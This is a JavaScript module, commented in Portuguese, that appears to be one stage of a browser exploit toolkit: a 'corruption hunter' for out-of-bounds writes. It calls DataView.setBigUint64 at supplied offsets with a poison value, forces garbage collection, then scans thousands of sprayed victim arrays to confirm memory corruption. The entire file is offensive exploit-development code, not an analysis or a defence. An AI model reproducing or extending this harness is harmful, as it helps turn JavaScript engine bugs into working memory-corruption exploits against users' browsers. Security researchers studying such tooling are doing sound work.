
/**
 * MÓDULO 3: EXECUTOR (CORRUPTION HUNTER - OOB WRITE)
 * Objetivo: Executar a escrita desanexada e varrer as vítimas
 * procurando a assinatura do nosso veneno.
 */

import { GC } from './mod_gc.js';

export const Executor = {

    blacklist: ['constructor', 'reload', 'location', 'open', 'alert', 'close'],
    
    // O VENENO: Este é o valor que tentaremos injetar na memória
    poisonValue: 0x1337133713371337n,

    run: function*(targets, payloads) {
        let testCount = 0;

        for (let target of targets) {
            let obj = target.instance;
            let props = [];
            
            try {
                let ownProps = Object.getOwnPropertyNames(obj);
                let protoProps = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
                props = [...new Set([...ownProps, ...protoProps])]; 
            } catch (e) { continue; }

            for (let prop of props) {
                if (this.blacklist.includes(prop) || prop.startsWith('on')) continue;

                // Para o OOB Write, focamos APENAS nas funções de ESCRITA
                if (!prop.startsWith('set')) continue;

                yield { type: 'STATUS', target: `${target.category} > ${target.name}.${prop}` };

                try {
                    let member = obj[prop];

                    if (typeof member === 'function') {
                        for (let p of payloads) {
                            try {
                                // ==========================================
                                // O GATILHO DE ESCRITA
                                // member.call(DataView, offset, valor, littleEndian)
                                // ==========================================
                                if (prop === 'setBigUint64') {
                                    member.call(obj, p.val, this.poisonValue, true);
                                } else {
                                    // Pula outras funções de set para não sujar a tela
                                    continue; 
                                }
                                
                                GC.force();
                                yield { type: 'GC_TICK' }; 

                                // ==========================================
                                // A VALIDAÇÃO (O SCAN DAS VÍTIMAS)
                                // ==========================================
                                let corruptionFound = false;
                                let victimIndex = -1;

                                // Varremos as 5000 vítimas rapidamente
                                for (let i = 0; i < window.victims.length; i++) {
                                    // Verifica os primeiros índices da vítima
                                    if (window.victims[i][0] === this.poisonValue || window.victims[i][1] === this.poisonValue) {
                                        corruptionFound = true;
                                        victimIndex = i;
                                        break;
                                    }
                                }

                                if (corruptionFound) {
                                    yield { 
                                        type: 'ANOMALY', 
                                        api: `${target.name}.${prop}`, 
                                        action: `WRITE [${p.label}]`,
                                        val: "SUCESSO",
                                        reason: `<br><br><span style="color:#fff; background:#ff0033; padding:8px; font-weight:bold; font-size:15px; display:block; text-align:center;">
                                        [!!!] OOB WRITE CONFIRMADO [!!!]<br>
                                        Vítima #${victimIndex} foi corrompida com o veneno 0x1337133713371337!
                                        </span>`
                                    };
                                }

                            } catch (e) {
                                // A mitigação bloqueou a escrita. Vida que segue.
                            }
                            
                            testCount++;
                            if (testCount % 5 === 0) yield { type: 'TICK', count: testCount };
                        }
                    }
                } catch (e) {}
            }
        }
        yield { type: 'FINISHED', count: testCount };
    },

    analyze: function() { return null; } // Desativado, validação é feita inline agora
};
